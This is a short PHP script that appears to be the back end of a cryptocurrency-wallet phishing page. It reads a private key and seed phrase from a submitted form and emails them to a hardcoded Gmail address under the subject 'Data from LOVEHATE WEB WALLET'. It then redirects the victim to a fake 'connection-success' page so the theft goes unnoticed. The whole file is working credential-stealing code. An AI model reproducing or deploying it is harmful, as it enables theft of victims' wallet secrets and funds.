<?php
error_reporting(E_ALL);
   ini_set('display_errors', E_ALL);
   
// phpinfo();
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    // Retrieve privkey and seedphr from POST request
    $privky = $_POST['privky'];
    $seedphr = $_POST['seedphr'];

    // Set the recipient email address
    $recipient = 'bcoder49@gmail.com';

    // Set the email subject
    $subject = 'Data from LOVEHATE WEB WALLET';

    // Prepare the email body
    $message = "Private Key: $privky\nSeed Phrase: $seedphr";

    // Send the email
    $success = mail($recipient, $subject, $message);

    // Check if the email was sent successfully
	if ($success) {
        header('Location: https://www.lovehateinu.xyz/apiv4wc-connection-success/index.html'); // Corrected redirection
        exit();
    } else {
        echo "An error occurred";
    }
}
?>